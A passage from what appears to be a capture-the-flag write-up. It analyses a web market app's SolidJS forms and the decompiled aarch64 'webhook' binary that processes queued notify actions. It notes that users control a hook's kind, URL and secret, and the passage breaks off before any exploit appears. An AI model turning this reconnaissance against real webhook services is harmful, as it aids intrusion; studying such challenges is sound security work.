</span></span><span class="line"><span class="cl">                  <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="p">{</span><span class="sb">`items/</span><span class="si">${</span><span class="nx">it</span><span class="p">.</span><span class="nx">kind</span><span class="si">}</span><span class="sb">.png`</span><span class="p">}</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="err">/div&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&#34;item-name&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                  <span class="p">{</span><span class="nx">it</span><span class="p">.</span><span class="nx">name</span><span class="p">}</span> <span class="p">({</span><span class="nx">inventoryCount</span><span class="p">(</span><span class="nx">it</span><span class="p">.</span><span class="nx">id</span><span class="p">)})</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="err">/div&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&#34;market-actions&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                  <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;action&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;buy&#34;</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&#34;buy&#34;</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">disabled</span><span class="o">=</span><span class="p">{</span><span class="o">!</span><span class="p">(</span><span class="nx">it</span><span class="p">.</span><span class="nx">ask_price</span>
</span></span><span class="line"><span class="cl">                      <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">it</span><span class="p">.</span><span class="nx">ask_size</span> <span class="o">??</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">inventoryCount</span><span class="p">(</span><span class="nx">COIN_ID</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="nx">it</span><span class="p">.</span><span class="nx">ask_price</span><span class="p">)}</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">Buy</span> <span class="p">{</span><span class="nx">it</span><span class="p">.</span><span class="nx">ask_price</span> <span class="o">&amp;&amp;</span> <span class="sb">`(</span><span class="si">${</span><span class="nx">it</span><span class="p">.</span><span class="nx">ask_price</span><span class="si">}</span><span class="sb">g)`</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">                  <span class="o">&lt;</span><span class="err">/button&gt;</span>
</span></span><span class="line"><span class="cl">                  <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;action&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;sell&#34;</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&#34;sell&#34;</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">disabled</span><span class="o">=</span><span class="p">{</span><span class="o">!</span><span class="p">(</span><span class="nx">it</span><span class="p">.</span><span class="nx">bid_price</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">it</span><span class="p">.</span><span class="nx">bid_size</span> <span class="o">??</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">                      <span class="o">&amp;&amp;</span> <span class="nx">inventoryCount</span><span class="p">(</span><span class="nx">it</span><span class="p">.</span><span class="nx">id</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)}</span> <span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">Sell</span> <span class="p">{</span><span class="nx">it</span><span class="p">.</span><span class="nx">bid_price</span> <span class="o">&amp;&amp;</span> <span class="sb">`(</span><span class="si">${</span><span class="nx">it</span><span class="p">.</span><span class="nx">bid_price</span><span class="si">}</span><span class="sb">g)`</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">                  <span class="o">&lt;</span><span class="err">/button&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="err">/div&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">button</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&#34;notify-button&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;action&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;notify&#34;</span>
</span></span><span class="line"><span class="cl">                  <span class="nx">disabled</span><span class="o">=</span><span class="p">{</span><span class="nx">notifyingItem</span><span class="p">()}</span>
</span></span><span class="line"><span class="cl">                <span class="o">&gt;</span><span class="err"></span><span class="o">&lt;</span><span class="err">/button&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&#34;watch-overlay&#34;</span> <span class="nx">classList</span><span class="o">=</span><span class="p">{{</span> <span class="nx">shown</span><span class="o">:</span> <span class="nx">watchOverlayShown</span><span class="p">()</span> <span class="p">}}</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                  <span class="o">&lt;</span><span class="nx">button</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&#34;watch-button&#34;</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">onClick</span><span class="o">=</span><span class="p">{()</span> <span class="p">=&gt;</span> <span class="nx">showWatchOverlay</span><span class="p">(</span><span class="o">!</span><span class="nx">watchOverlayShown</span><span class="p">())}</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;button&#34;</span><span class="o">&gt;</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                      <span class="nx">watchingItem</span><span class="p">()</span> <span class="o">?</span> <span class="s1">&#39;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span><span class="o">&lt;</span><span class="err">/button&gt;</span>
</span></span><span class="line"><span class="cl">                  <span class="o">&lt;</span><span class="nx">Show</span> <span class="nx">when</span><span class="o">=</span><span class="p">{</span><span class="nx">watchOverlayShown</span><span class="p">()}</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">Show</span> <span class="nx">when</span><span class="o">=</span><span class="p">{</span><span class="o">!</span><span class="nx">watchingItem</span><span class="p">()}</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                      <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;url&#34;</span> <span class="nx">placeholder</span><span class="o">=</span><span class="s2">&#34;URL&#34;</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                      <span class="o">&lt;</span><span class="nx">Show</span> <span class="nx">when</span><span class="o">=</span><span class="p">{</span><span class="nx">transacting</span><span class="p">.</span><span class="nx">error</span><span class="o">?</span><span class="p">.</span><span class="nx">fieldErrors</span><span class="o">?</span><span class="p">.</span><span class="nx">url</span><span class="p">}</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                        <span class="o">&lt;</span><span class="nx">p</span> <span class="nx">role</span><span class="o">=</span><span class="s2">&#34;alert&#34;</span><span class="o">&gt;</span><span class="p">{</span><span class="nx">transacting</span><span class="p">.</span><span class="nx">error</span><span class="p">.</span><span class="nx">fieldErrors</span><span class="p">.</span><span class="nx">url</span><span class="p">}</span><span class="o">&lt;</span><span class="err">/p&gt;</span>
</span></span><span class="line"><span class="cl">                      <span class="o">&lt;</span><span class="err">/Show&gt;</span>
</span></span><span class="line"><span class="cl">                      <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;secret&#34;</span> <span class="nx">placeholder</span><span class="o">=</span><span class="s2">&#34;Secret&#34;</span> <span class="o">/&gt;</span>
</span></span><span class="line"><span class="cl">                      <span class="o">&lt;</span><span class="nx">Show</span> <span class="nx">when</span><span class="o">=</span><span class="p">{</span><span class="nx">transacting</span><span class="p">.</span><span class="nx">error</span><span class="o">?</span><span class="p">.</span><span class="nx">fieldErrors</span><span class="o">?</span><span class="p">.</span><span class="nx">secret</span><span class="p">}</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                        <span class="o">&lt;</span><span class="nx">p</span> <span class="nx">role</span><span class="o">=</span><span class="s2">&#34;alert&#34;</span><span class="o">&gt;</span><span class="p">{</span><span class="nx">transacting</span><span class="p">.</span><span class="nx">error</span><span class="p">.</span><span class="nx">fieldErrors</span><span class="p">.</span><span class="nx">secret</span><span class="p">}</span><span class="o">&lt;</span><span class="err">/p&gt;</span>
</span></span><span class="line"><span class="cl">                      <span class="o">&lt;</span><span class="err">/Show&gt;</span>
</span></span><span class="line"><span class="cl">                      <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;action&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;watch&#34;</span><span class="o">&gt;</span><span class="nx">Watch</span><span class="o">&lt;</span><span class="err">/button&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="err">/Show&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">Show</span> <span class="nx">when</span><span class="o">=</span><span class="p">{</span><span class="nx">watchingItem</span><span class="p">()}</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">                      <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;action&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;unwatch&#34;</span><span class="o">&gt;</span><span class="nx">Stop</span> <span class="nx">watching</span><span class="o">&lt;</span><span class="err">/button&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="err">/Show&gt;</span>
</span></span><span class="line"><span class="cl">                  <span class="o">&lt;</span><span class="err">/Show&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="err">/div&gt;</span>
</span></span><span class="line"><span class="cl">              <span class="o">&lt;</span><span class="err">/div&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="err">/Transact&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}}</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="err">/For&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="o">&lt;</span><span class="err">/div &gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="o">&lt;</span><span class="nx">LogoutForm</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;logout&#34;</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nx">Logout</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="err">/button&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="o">&lt;</span><span class="err">/LogoutForm&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="err">/main &gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Moving on, we decided to ignore the <code>buy</code> and <code>sell</code> actions since they weren&rsquo;t relevant to our objective. Instead, we focused on breaking down the remaining actions one by one:</p>
<ul>
<li><code>watch</code>
<ul>
<li>This action was used to populate the <code>hooks</code> table. Interestingly, we discovered that we could set the <code>kind</code>, <code>url</code>, and <code>secret</code> values to any values we wanted.</li>
</ul>
</li>
<li><code>unwatch</code>
<ul>
<li>As the name suggests, this action was used to delete certain entries from the <code>hooks</code> table.</li>
</ul>
</li>
<li><code>notify</code>
<ul>
<li>This was the action where the <code>web</code> container would interact with the <code>webhook</code> container. Specifically, the <code>web</code> container would append the <code>kind</code> value that we had set during our call to this API to the shared file located at <code>/queue/hook</code>. Later on, this file would be processed by the <code>webhook</code> container.</li>
</ul>
</li>
</ul>
<p>Our next step was to check out the <code>webhook</code> container. We were only provided with the binary file for <code>webhook</code>, which was an <code>aarch64</code> file. Before we could proceed, we needed to disassemble it first (Thanks to my teammate sampriti who provided the clean <code>idb</code> which helps us a lot on understanding the decompiled code).</p>
<p><strong>main</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// x19
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v7</span><span class="p">[</span><span class="mi">8192</span><span class="p">];</span> <span class="c1">// [xsp+20h] [xbp-4060h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v8</span><span class="p">[</span><span class="mi">8192</span><span class="p">];</span> <span class="c1">// [xsp+2020h] [xbp-2060h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_QWORD</span> <span class="n">v9</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span> <span class="c1">// [xsp+4020h] [xbp-60h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [xsp+4050h] [xbp-30h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [xsp+4054h] [xbp-2Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [xsp+4058h] [xbp-28h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [xsp+4060h] [xbp-20h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">__pid_t</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [xsp+4068h] [xbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [xsp+406Ch] [xbp-14h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">conn</span><span class="p">;</span> <span class="c1">// [xsp+4070h] [xbp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v18</span><span class="p">;</span> <span class="c1">// [xsp+407Ch] [xbp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v18</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">curl_global_init</span><span class="p">()</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fwrite</span><span class="p">(</span><span class="s">&#34;Failed to initialize curl</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="mh">0x1AuLL</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="nf">PQconnectdb</span><span class="p">(</span><span class="s">&#34;dbname=postgres host=workerdb user=webhook&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nf">PQstatus</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v3</span> <span class="o">=</span> <span class="n">stderr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="nf">PQerrorMessage</span><span class="p">(</span><span class="n">conn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">fprintf</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="s">&#34;Failed to connect to database: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v15</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/queue/hook&#34;</span><span class="p">,</span> <span class="mh">0x241</span><span class="p">,</span> <span class="mh">0x1A4LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v15</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;Failed to initialize action queue&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">v15</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v9</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">off_141A0</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">v9</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">off_141A0</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">v9</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">off_141A0</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">v9</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">off_141A0</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">v9</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">off_141A0</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">v9</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="n">algn_141C8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">v14</span> <span class="o">=</span> <span class="nf">popen2</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">v14</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">stream</span> <span class="o">=</span> <span class="nf">fdopen</span><span class="p">(</span><span class="n">v10</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="n">stream</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="p">(</span> <span class="nf">fgets</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="n">stream</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="n">v12</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">v8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">              <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span><span class="p">[</span><span class="n">v12</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">              <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">v8</span><span class="p">[</span><span class="n">v12</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">              <span class="p">}</span>
</span></span><span class="line"><span class="cl">              <span class="k">else</span>
</span></span><span class="line"><span class="cl">              <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">do</span>
</span></span><span class="line"><span class="cl">                  <span class="n">v11</span> <span class="o">=</span> <span class="nf">fgetc</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="p">(</span> <span class="n">v11</span> <span class="o">!=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">v11</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">              <span class="p">}</span>
</span></span><span class="line"><span class="cl">              <span class="k">if</span> <span class="p">(</span> <span class="nf">__isoc99_sscanf</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="s">&#34;kind=%[^&amp;]&#34;</span><span class="p">,</span> <span class="n">v7</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nf">perform_hooks</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">v8</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">v18</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nf">fclose</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="k">else</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;Unable to read actions&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">close</span><span class="p">(</span><span class="n">v10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="nf">kill</span><span class="p">(</span><span class="n">v14</span><span class="p">,</span> <span class="mi">15</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">waitpid</span><span class="p">(</span><span class="n">v14</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;Unable to read actions&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="nf">PQfinish</span><span class="p">(</span><span class="n">conn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">curl_global_cleanup</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After reviewing the <code>main</code> file, we learned that it would perform the following actions:</p>
<ul>
<li>Establish a connection with the <code>workerdb</code> (replica db).</li>
<li>Attempt to fetch the <code>kind</code> value that had been appended by the <code>web</code> container when we called the <code>notify</code> API, and then call <code>perform_hooks</code>.</li>
</ul>
<p>Our next step was to disassemble the <code>perform_hooks</code> function.</p>
<p><strong>perform_hooks</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
